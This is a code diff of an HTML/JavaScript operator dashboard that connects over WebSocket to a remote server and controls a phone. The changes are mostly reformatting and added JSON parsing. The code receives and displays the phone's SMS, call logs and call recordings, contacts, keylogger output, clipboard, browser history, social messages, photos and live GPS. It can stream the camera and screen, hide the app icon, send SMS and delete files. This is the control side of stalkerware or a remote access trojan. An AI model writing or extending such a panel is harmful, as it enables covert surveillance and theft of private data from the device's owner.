@@ -362,12 +362,12 @@
             border-color:#1976ff;
         }
         img, video {
-    max-width: 100%;
-    max-height: 70vh;
-    border-radius: 8px;
-    display: block;
-    margin: 0 auto;
-}
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 8px;
+            display: block;
+            margin: 0 auto;
+        }
         audio{
             width:100%;
             margin-top:15px;
@@ -383,88 +383,85 @@
             margin-left: 10px;
         }
 
+        .screen-container{
+            width:100%;
+            aspect-ratio:16/9;
+            background:black;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
 
-.screen-container{
-    width:100%;
-    aspect-ratio:16/9;
-    background:black;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
-
-.screen-container video{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-}
+        .screen-container video{
+            width:100%;
+            height:100%;
+            object-fit:contain;
+        }
+        
         /* ---------- MODAL / POPUP STYLES ---------- */
-.modal-overlay{
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.9);
-    display:none;
-    justify-content:center;
-    align-items:center;
-    z-index:10000;
-}
+        .modal-overlay{
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.9);
+            display:none;
+            justify-content:center;
+            align-items:center;
+            z-index:10000;
+        }
         .modal-overlay.show {
             display: flex;
         }
 
-        /* Outer wrapper: phone frame + control strip stacked vertically */
-        
-.mobile-popup{
-    width:min(92vw, calc(92vh * 9 / 16));
-    height:92vh;
-    display:flex;
-    flex-direction:column;
-    background:#0f0f0f;
-    border-radius:26px;
-    border:6px solid #2e2e2e;
-    box-shadow:0 40px 120px rgba(0,0,0,0.9);
-    overflow:hidden;
-}
-.phone-frame{
-    flex:1;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:black;
-    overflow:hidden;
-}
+        .mobile-popup{
+            width:min(92vw, calc(92vh * 9 / 16));
+            height:92vh;
+            display:flex;
+            flex-direction:column;
+            background:#0f0f0f;
+            border-radius:26px;
+            border:6px solid #2e2e2e;
+            box-shadow:0 40px 120px rgba(0,0,0,0.9);
+            overflow:hidden;
+        }
+        .phone-frame{
+            flex:1;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            background:black;
+            overflow:hidden;
+        }
 
-.phone-frame video{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-}
+        .phone-frame video{
+            width:100%;
+            height:100%;
+            object-fit:contain;
+        }
 
-        /* Control bar sits BELOW the phone frame */
-   .popup-controls{
-    flex-shrink:0;
-    background:#111;
-    padding:8px;
-    display:flex;
-    gap:6px;
-    justify-content:space-around;
-    align-items:center;
-}
-       .popup-controls button {
-    flex: 1;
-    background: #1e1e1e;
-    color: white;
-    border: none;
-    padding: 5px 0;
-    border-radius: 6px;
-    cursor: pointer;
-    font-size: 10px;               /* bigger icons */
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: background 0.15s;
-    min-width: 50px;
-}
+        .popup-controls{
+            flex-shrink:0;
+            background:#111;
+            padding:8px;
+            display:flex;
+            gap:6px;
+            justify-content:space-around;
+            align-items:center;
+        }
+        .popup-controls button {
+            flex: 1;
+            background: #1e1e1e;
+            color: white;
+            border: none;
+            padding: 5px 0;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.15s;
+            min-width: 50px;
+        }
         .popup-controls button:hover {
             background: #3a3a3c;
             transform: scale(1.05);
@@ -486,19 +483,57 @@
             background: #505052;
         }
 
-        /* blur background when modal is open */
         body.modal-open #sidebar,
         body.modal-open #main {
             pointer-events: none;
             filter: blur(4px);
             transition: filter 0.3s;
         }
-        /* small connection helper */
+        
         .ws-debug {
             font-size: 11px;
             color: #666;
             margin-top: 6px;
             display: none;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background-color: #4caf50;
+            transition: width 0.3s ease;
+        }
+        
+        .usage-bar {
+            height: 10px;
+            border-radius: 5px;
+            background-color: #1976ff;
+        }
+        
+        .app-usage-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-bottom: 1px solid #eef2f5;
+        }
+        
+        .app-usage-name {
+            flex: 1;
+            font-weight: 500;
+        }
+        
+        .app-usage-time {
+            width: 80px;
+            text-align: right;
+            color: #666;
         }
     </style>
 </head>
@@ -509,7 +544,7 @@
     <div class="mobile-popup">
         <div class="phone-frame">
             <div class="screen-container">
-            <video id="modalScreenVideo" autoplay playsinline></video>
+                <video id="modalScreenVideo" autoplay playsinline></video>
             </div>
         </div>
         <div class="popup-controls">
@@ -635,13 +670,13 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-<script type="module">
+<script>
     // ---------- GLOBALS ----------
-    const WS_URL = "wss://mirror-view.onrender.com";   // keep as is – working endpoint
+    const WS_URL = "wss://mirror-view.onrender.com";
     let ws = null;
     let reconnectTimer = null;
     let reconnectAttempts = 0;
-    const MAX_RECONNECT_DELAY = 30000; // 30s
+    const MAX_RECONNECT_DELAY = 30000;
 
     // WebRTC peer connections
     let screenPC = null;
@@ -664,7 +699,7 @@
 
     // Track the last command sent to interpret raw responses
     let pendingCommand = null;
-    let currentDeviceId = null; // Will be set when device registers
+    let currentDeviceId = null;
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
@@ -673,27 +708,22 @@
     // Modal elements
     const modalOverlay = document.getElementById('screenModalOverlay');
     const modalVideo = document.getElementById('modalScreenVideo');
-    modalVideo.addEventListener("loadedmetadata", () => {
-        const w = modalVideo.videoWidth;
-        const h = modalVideo.videoHeight;
-        const popup = document.querySelector(".mobile-popup");
-        if (h > w) {
-            popup.style.aspectRatio = "9 / 16";
-        } else {
-            popup.style.aspectRatio = "16 / 9";
-        }
-    });
     
     const modalSnapBtn = document.getElementById('modalSnapBtn');
     const modalRecordBtn = document.getElementById('modalRecordBtn');
     const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
     const modalCloseBtn = document.getElementById('modalCloseBtn');
-   
+    
+    let liveGpsActive = false;
+    const newAlerts = [];
+    let appsData = [];
+
     function getFormattedDateTime() {
         const d = new Date();
         const pad = (n) => n.toString().padStart(2, '0');
         return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
     }
+
     // ---------- ICE SERVERS ----------
     const ICE_SERVERS = [
         { urls: "stun:stun.relay.metered.ca:80" },
@@ -711,7 +741,7 @@
         }
         const payload = {
             type: 'SIGNALING',
-            deviceId: currentDeviceId, // Include deviceId if known
+            deviceId: currentDeviceId,
             data: msg
         };
         ws.send(JSON.stringify(payload));
@@ -779,37 +809,35 @@
             const pc = getPCForType(msg.streamType);
             if (pc && msg.candidate) {
                 pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
-                console.log('ICE candidate added for', msg.streamType);
             }
         }
     }
 
     // ---------- MODAL CONTROL ----------
-   function openScreenModal() {
-    modalOverlay.classList.add('show');
-    document.body.classList.add('modal-open');
-    modalRecordBtn.innerText = '🔴';
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
+    function openScreenModal() {
+        modalOverlay.classList.add('show');
+        document.body.classList.add('modal-open');
+        modalRecordBtn.innerText = '🔴';
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+        }
+        screenMediaRecorder = null;
+        screenRecordedChunks = [];
     }
-    screenMediaRecorder = null;
-    screenRecordedChunks = [];
-}
 
     function closeScreenModal() {
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+        }
+        modalOverlay.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        if (screenActive) {
+            toggleScreen();
+        }
+        modalRecordBtn.innerText = '🔴';
     }
-    modalOverlay.classList.remove('show');
-    document.body.classList.remove('modal-open');
-    if (screenActive) {
-        // do not auto‑stop screen share; user may close modal but keep streaming? we follow original: stop screen
-        toggleScreen();
-    }
-    modalRecordBtn.innerText = '🔴';
-}
 
-    // ---------- SCREEN SHARE (modified for modal) ----------
+    // ---------- SCREEN SHARE ----------
     async function toggleScreen() {
         console.log('toggleScreen called, current screenActive:', screenActive);
         if (screenActive) {
@@ -819,7 +847,7 @@
             }
             document.getElementById('screenBtn').innerText = 'Start Screen';
             screenActive = false;
-            closeScreenModal(); // close the modal
+            closeScreenModal();
             sendSignalingMessage({ type: 'STOP_SCREEN' });
         } else {
             openScreenModal();
@@ -849,7 +877,7 @@
         }
     }
 
-    // ---------- SNAP SCREEN (from modal) ----------
+    // ---------- SNAP SCREEN ----------
     function snapScreenFromModal() {
         if (!modalVideo || !modalVideo.videoWidth) {
             alert('No active screen share or video not ready');
@@ -869,60 +897,61 @@
         }, 'image/png');
     }
 
-    // ---------- RECORD SCREEN (from modal) ----------
+    // ---------- RECORD SCREEN ----------
     let screenMediaRecorder = null;
     let screenRecordedChunks = [];
 
     function toggleScreenRecording() {
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
-        modalRecordBtn.innerText = '🔴';
-    } else {
-        if (!modalVideo.srcObject) {
-            alert('Phone Screen Off');
-            return;
-        }
-        screenRecordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = modalVideo.srcObject;
-
-        if (modalVideo.videoWidth === 0) {
-            modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+            modalRecordBtn.innerText = '🔴';
         } else {
-            startScreenRecording(canvas, ctx, stream);
+            if (!modalVideo.srcObject) {
+                alert('Phone Screen Off');
+                return;
+            }
+            screenRecordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = modalVideo.srcObject;
+
+            if (modalVideo.videoWidth === 0) {
+                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
+            } else {
+                startScreenRecording(canvas, ctx, stream);
+            }
         }
     }
-}
 
     function startScreenRecording(canvas, ctx, originalStream) {
-    canvas.width = modalVideo.videoWidth;
-    canvas.height = modalVideo.videoHeight;
+        canvas.width = modalVideo.videoWidth;
+        canvas.height = modalVideo.videoHeight;
 
-    function drawVideoFrame() {
-        ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
-        requestAnimationFrame(drawVideoFrame);
+        function drawVideoFrame() {
+            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
+            requestAnimationFrame(drawVideoFrame);
+        }
+        drawVideoFrame();
+
+        const canvasStream = canvas.captureStream(30);
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+
+        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
+        screenMediaRecorder.onstop = () => {
+            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        screenMediaRecorder.start();
+        modalRecordBtn.innerText = '🟢';
     }
-    drawVideoFrame();
 
-    const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
-    screenMediaRecorder.onstop = () => {
-        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `screenVideo-${getFormattedDateTime()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
-    };
-    screenMediaRecorder.start();
-    modalRecordBtn.innerText = '🟢';
-}
     // Fullscreen toggle
     function toggleFullscreen() {
         if (!document.fullscreenElement) {
@@ -945,11 +974,13 @@
         const useMic = document.getElementById('liveMicCheckbox').checked;
 
         panel.innerHTML = `
-            <video id="liveCamVideo" autoplay playsinline></video>
-            <div class="live-controls">
-                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
-                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
-                <button class="stop" onclick="stopLiveStream()">Stop</button>
+            <div style="position:relative;">
+                <video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video>
+                <div class="live-controls" style="margin-top:10px;">
+                    <button onclick="takeSnapshot()" id="snapshotBtn" style="background:#1976ff;">📸 Snapshot</button>
+                    <button onclick="toggleRecording()" id="recordBtn" style="background:#ff9800;">🔴 Record</button>
+                    <button class="stop" onclick="stopLiveStream()" style="background:#d32f2f;">⏹ Stop</button>
+                </div>
             </div>
         `;
 
@@ -1037,7 +1068,7 @@
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- COMMAND SENDING (JSON) ----------
+    // ---------- COMMAND SENDING ----------
     function sendCommand(command, params = {}) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>`;
@@ -1049,11 +1080,11 @@
             command: command,
             requestId: requestId,
             params: params,
-            deviceId: currentDeviceId, // Include deviceId if known
+            deviceId: currentDeviceId,
             timestamp: Date.now()
         };
         ws.send(JSON.stringify(payload));
-        panel.innerHTML = `📤 Command sent: ${command}`;
+        panel.innerHTML = `<div style="color:#1976ff;">📤 Command sent: ${command}</div>`;
         pendingCommand = command;
         console.log('Sent command:', command, params);
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
@@ -1066,54 +1097,96 @@
             return;
         }
         ws.send(msg);
-        panel.innerHTML = `📤 Plain text sent: ${msg}`;
+        panel.innerHTML = `<div style="color:#1976ff;">📤 Plain text sent: ${msg}</div>`;
     }
 
-    // ---------- PLAIN TEXT / JSON HANDLERS ----------
+    // ---------- JSON RESPONSE HANDLER ----------
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
         
-        // Store device ID if present
         if (json.deviceId) {
             currentDeviceId = json.deviceId;
         }
         
+        // Handle array responses (from plain text fallback)
+        if (Array.isArray(json)) {
+            if (pendingCommand === 'GET_SMS') {
+                dataType = 'sms';
+                currentData = json;
+                renderTable();
+            } else if (pendingCommand === 'GET_CALL_LOGS') {
+                dataType = 'call';
+                currentData = json;
+                renderTable();
+            } else if (pendingCommand === 'LIST_FILES') {
+                dataType = 'file';
+                currentData = json;
+                renderFiles();
+            }
+            pendingCommand = null;
+            return;
+        }
+        
+        // Handle JSON responses by type
         switch (json.type) {
             // Basic responses
             case 'SMS_DATA':
-                dataType = 'sms';
-                currentData = Array.isArray(json.data) ? json.data : [];
-                renderTable();
+                try {
+                    const smsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    dataType = 'sms';
+                    currentData = Array.isArray(smsData) ? smsData : [];
+                    renderTable();
+                } catch (e) {
+                    console.error('SMS parse error:', e);
+                    showNotification('Error parsing SMS data');
+                }
                 pendingCommand = null;
                 break;
+                
             case 'CALL_LOGS':
-                dataType = 'call';
-                currentData = Array.isArray(json.data) ? json.data : [];
-                renderTable();
+                try {
+                    const callData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    dataType = 'call';
+                    currentData = Array.isArray(callData) ? callData : [];
+                    renderTable();
+                } catch (e) {
+                    console.error('Call logs parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'FILE_LIST':
-                dataType = 'file';
-                currentData = Array.isArray(json.data) ? json.data : [];
-                renderFiles();
+                try {
+                    const fileData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    dataType = 'file';
+                    currentData = Array.isArray(fileData) ? fileData : [];
+                    renderFiles();
+                } catch (e) {
+                    console.error('File list parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'LOCATION_UPDATE':
                 renderMap(json.data);
                 pendingCommand = null;
                 break;
+                
             case 'CAMERA_IMAGE':
                 displayCapturedImage(json.data);
                 pendingCommand = null;
                 break;
+                
             case 'AUDIO_RECORDING':
                 showAudio(json.data);
                 pendingCommand = null;
                 break;
+                
             case 'ERROR':
-                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+                panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${json.error}</div>`;
                 pendingCommand = null;
                 break;
+                
             case 'DEVICE_STATUS':
                 setStatus(json.status);
                 pendingCommand = null;
@@ -1126,6 +1199,7 @@
                 showNotification('App icon hidden');
                 pendingCommand = null;
                 break;
+                
             case 'APP_SHOWN':
                 iconHidden = false;
                 document.getElementById('iconBtn').innerText = 'Hide Icon';
@@ -1138,14 +1212,17 @@
                 showNotification('🔦 Flashlight ON');
                 pendingCommand = null;
                 break;
+                
             case 'FLASH_OFF':
                 showNotification('🔦 Flashlight OFF');
                 pendingCommand = null;
                 break;
+                
             case 'FLASH_TIMED':
                 showNotification('⏱️ Flash timed complete');
                 pendingCommand = null;
                 break;
+                
             case 'FLASH_BLINK':
                 showNotification('✨ Flash blink complete');
                 pendingCommand = null;
@@ -1158,6 +1235,7 @@
                 showNotification('Screen share started');
                 pendingCommand = null;
                 break;
+                
             case 'SCREEN_SHARE_STOPPED':
                 screenActive = false;
                 document.getElementById('screenBtn').innerText = 'Start Screen';
@@ -1168,104 +1246,168 @@
                 
             // Data responses
             case 'CONTACTS_DATA':
-                displayContacts(json.data);
+                try {
+                    const contactsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayContacts(contactsData);
+                } catch (e) {
+                    console.error('Contacts parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'INSTALLED_APPS':
-                displayInstalledApps(json.data);
+                try {
+                    const appsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayInstalledApps(appsData);
+                } catch (e) {
+                    console.error('Apps parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'APP_USAGE_DATA':
-                displayAppUsage(json.data);
+                try {
+                    const usageData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayAppUsage(usageData);
+                } catch (e) {
+                    console.error('App usage parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'NOTIFICATIONS_DATA':
-                displayNotifications(json.data);
+                try {
+                    const notifData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayNotifications(notifData);
+                } catch (e) {
+                    console.error('Notifications parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'NOTIFICATIONS_CLEARED':
                 showNotification('Notifications cleared');
                 pendingCommand = null;
                 break;
+                
             case 'BROWSER_HISTORY_DATA':
-                displayBrowserHistory(json.data);
+                try {
+                    const historyData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayBrowserHistory(historyData);
+                } catch (e) {
+                    console.error('History parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'KEYLOG_DATA':
-                displayKeylog(json.data);
+                try {
+                    const keylogData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayKeylog(keylogData);
+                } catch (e) {
+                    console.error('Keylog parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'KEYLOG_CLEARED':
                 showNotification('Keylog cleared');
                 pendingCommand = null;
                 break;
+                
             case 'CLIPBOARD_DATA':
-                displayClipboard(json.data);
+                try {
+                    const clipData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayClipboard(clipData);
+                } catch (e) {
+                    displayClipboard({ content: json.data });
+                }
                 pendingCommand = null;
                 break;
+                
             case 'WIFI_NETWORKS_DATA':
-                displayWifiNetworks(json.data);
+                try {
+                    const wifiData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayWifiNetworks(wifiData);
+                } catch (e) {
+                    console.error('WiFi parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'GEOFENCE_SET':
                 showNotification('✅ Geofence activated');
                 pendingCommand = null;
                 break;
+                
             case 'GEOFENCE_CLEARED':
                 showNotification('Geofence cleared');
                 pendingCommand = null;
                 break;
-            case 'GEOFENCE_INFO': {
-                const gfInfo = json.data;
-                if (gfInfo && gfInfo.active) {
-                    panel.innerHTML = '<h3>🗺️ Geofence Active</h3><p>📍 ' + gfInfo.lat.toFixed(5) + ', ' + gfInfo.lon.toFixed(5) + '</p><p>📏 Radius: ' + gfInfo.radius + 'm</p>';
-                } else {
-                    panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
+                
+            case 'GEOFENCE_INFO':
+                try {
+                    const gfInfo = json.data;
+                    if (gfInfo && gfInfo.active) {
+                        panel.innerHTML = '<h3>🗺️ Geofence Active</h3><p>📍 ' + parseFloat(gfInfo.lat).toFixed(5) + ', ' + parseFloat(gfInfo.lon).toFixed(5) + '</p><p>📏 Radius: ' + gfInfo.radius + 'm</p>';
+                    } else {
+                        panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
+                    }
+                } catch (e) {
+                    console.error('Geofence info error:', e);
                 }
                 pendingCommand = null;
                 break;
-            }
-            case 'GEOFENCE_ALERT': {
+                
+            case 'GEOFENCE_ALERT':
                 const gfMsg = json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone';
                 pushAlert('Geofence', gfMsg);
                 showNotification(gfMsg);
                 pendingCommand = null;
                 break;
-            }
+                
             case 'SCHEDULED_CAPTURE_SET':
                 showNotification('✅ Auto-capture started');
                 pendingCommand = null;
                 break;
+                
             case 'SCHEDULED_CAPTURE_STOPPED':
                 showNotification('Auto-capture stopped');
                 pendingCommand = null;
                 break;
+                
             case 'DEVICE_LOCKED':
                 showNotification('🔒 Screen locked');
                 pendingCommand = null;
                 break;
+                
             case 'SMS_SENT':
                 showNotification('✅ SMS sent successfully');
                 pendingCommand = null;
                 break;
+                
             case 'FILE_DELETED':
                 showNotification('File deleted');
                 sendCommand('LIST_FILES', { path: currentPath });
                 pendingCommand = null;
                 break;
+                
             case 'VIBRATE_COMPLETE':
                 showNotification('📳 Vibrated');
                 pendingCommand = null;
                 break;
+                
             case 'UNINSTALL_INITIATED':
                 showNotification('Uninstall initiated');
                 pendingCommand = null;
                 break;
+                
             case 'APP_OPENED':
                 showNotification('App opened');
                 pendingCommand = null;
                 break;
-            case 'GPS_UPDATES_STOPPED': {
+                
+            case 'GPS_UPDATES_STOPPED':
                 liveGpsActive = false;
                 const gpsBtn = document.getElementById('liveGpsBtn');
                 if (gpsBtn) {
@@ -1275,87 +1417,135 @@
                 showNotification('GPS tracking stopped');
                 pendingCommand = null;
                 break;
-            }
-            // GPS Update (live tracking)
-            case 'LOCATION_UPDATE': {
-                if (liveGpsActive) {
-                    renderMap(json.data);
+                
+            // Feature 1: Social Messages
+            case 'SOCIAL_MESSAGES_DATA':
+                try {
+                    const socialData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displaySocialMessages(socialData);
+                } catch (e) {
+                    console.error('Social messages parse error:', e);
                 }
                 pendingCommand = null;
                 break;
-            }
-            // ── Feature 1: Social Messages ─────────────────────────────────
-            case 'SOCIAL_MESSAGES_DATA':
-                displaySocialMessages(json.data);
-                pendingCommand = null;
-                break;
+                
             case 'NOTIFICATION_LIVE':
                 pushLiveNotification(json);
                 pendingCommand = null;
                 break;
-            // ── Feature 2: Call Recordings ─────────────────────────────────
+                
+            // Feature 2: Call Recordings
             case 'CALL_RECORDINGS_DATA':
-                displayCallRecordings(json.data);
+                try {
+                    const recData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayCallRecordings(recData);
+                } catch (e) {
+                    console.error('Call recordings parse error:', e);
+                }
                 pendingCommand = null;
                 break;
-            case 'CALL_AUDIO_DATA': {
-                const _aud = json.data;
-                if (_aud && _aud.audio) playCallRecording(_aud);
+                
+            case 'CALL_AUDIO_DATA':
+                try {
+                    const audioData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    if (audioData && audioData.audio) playCallRecording(audioData);
+                } catch (e) {
+                    console.error('Call audio parse error:', e);
+                }
                 pendingCommand = null;
                 break;
-            }
+                
             case 'CALL_ALERT':
                 handleCallAlert(json);
                 pendingCommand = null;
                 break;
-            // ── Feature 3: Photo Gallery ───────────────────────────────────
+                
+            // Feature 3: Photo Gallery
             case 'RECENT_IMAGES_DATA':
-                displayPhotoGallery(json.data);
+                try {
+                    const imgData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayPhotoGallery(imgData);
+                } catch (e) {
+                    console.error('Images parse error:', e);
+                }
                 pendingCommand = null;
                 break;
-            case 'IMAGE_DATA': {
-                const _img = json.data;
-                if (_img && _img.image) showFullImage(_img.image, _img.mediaId);
+                
+            case 'IMAGE_DATA':
+                try {
+                    const imgData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    if (imgData && imgData.image) showFullImage(imgData.image, imgData.mediaId);
+                } catch (e) {
+                    console.error('Image data parse error:', e);
+                }
                 pendingCommand = null;
                 break;
-            }
-            // ── Feature 7: Location History ────────────────────────────────
+                
+            // Feature 7: Location History
             case 'LOCATION_HISTORY_DATA':
-                displayLocationHistory(json.data);
+                try {
+                    const locData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayLocationHistory(locData);
+                } catch (e) {
+                    console.error('Location history parse error:', e);
+                }
                 pendingCommand = null;
                 break;
-            // ── Feature 5+6: App Events ────────────────────────────────────
+                
+            // Feature 5+6: App Events
             case 'APP_EVENTS_DATA':
-                displayAppEvents(json.data);
+                try {
+                    const eventsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayAppEvents(eventsData);
+                } catch (e) {
+                    console.error('App events parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'APP_INSTALLED':
                 pushAlert('📱 App Installed', (json.name || json.pkg));
                 showNotification('📱 Installed: ' + (json.name || json.pkg));
                 pendingCommand = null;
                 break;
+                
             case 'APP_REMOVED':
                 pushAlert('🗑️ App Removed', (json.name || json.pkg));
                 showNotification('🗑️ Removed: ' + (json.name || json.pkg));
                 pendingCommand = null;
                 break;
-            // ── Feature 8: SMS Keywords ────────────────────────────────────
+                
+            // Feature 8: SMS Keywords
             case 'SMS_KEYWORDS_SET':
-                showNotification('✅ Keywords saved: ' + json.data);
+                showNotification('✅ Keywords saved');
                 pendingCommand = null;
                 break;
+                
             case 'SMS_KEYWORDS_DATA':
-                displaySmsKeywords(json.data);
+                try {
+                    const kwData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displaySmsKeywords(kwData);
+                } catch (e) {
+                    console.error('Keywords parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'SMS_KEYWORDS_CLEARED':
                 showNotification('Keywords cleared');
                 pendingCommand = null;
                 break;
+                
             case 'SMS_ALERTS_DATA':
-                displaySmsAlerts(json.data);
+                try {
+                    const alertsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displaySmsAlerts(alertsData);
+                } catch (e) {
+                    console.error('SMS alerts parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'SMS_KEYWORD_ALERT':
                 pushAlert('🔑 Keyword: ' + json.keyword,
                     'From ' + json.from + ': ' + json.body);
@@ -1366,125 +1556,115 @@
             // Device registration
             case 'DEVICE_REGISTRATION':
                 currentDeviceId = json.deviceId;
-                showNotification('Device registered: ' + json.name);
+                showNotification('Device registered: ' + (json.name || json.deviceId));
                 break;
                 
             // Heartbeat
             case 'HEARTBEAT':
-                // Just ignore, it's keepalive
+                // Ignore
                 break;
                 
             default:
                 console.log('Unhandled JSON type:', json.type);
-                // Try to handle as array data
-                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
-                    dataType = 'file';
-                    currentData = json;
-                    renderFiles();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
-                    dataType = 'sms';
-                    currentData = json;
-                    renderTable();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
-                    dataType = 'call';
-                    currentData = json;
-                    renderTable();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
-                    renderMap(json);
-                    pendingCommand = null;
-                }
                 break;
         }
     }
 
+    // ---------- PLAIN TEXT HANDLER ----------
     function handlePlainText(msg) {
         console.log('Plain text received:', msg);
         
         if (msg.startsWith("STATUS:")) {
             setStatus(msg.substring(7));
             pendingCommand = null;
+            
         } else if (msg.startsWith("LOC_DATA:")) {
             try {
                 const data = JSON.parse(msg.substring(9));
                 renderMap(data);
                 pendingCommand = null;
             } catch (err) { console.error(err); }
+            
         } else if (msg.startsWith("FILE_LIST:")) {
             try {
-                currentData = JSON.parse(msg.substring(10));
+                const data = JSON.parse(msg.substring(10));
+                currentData = data;
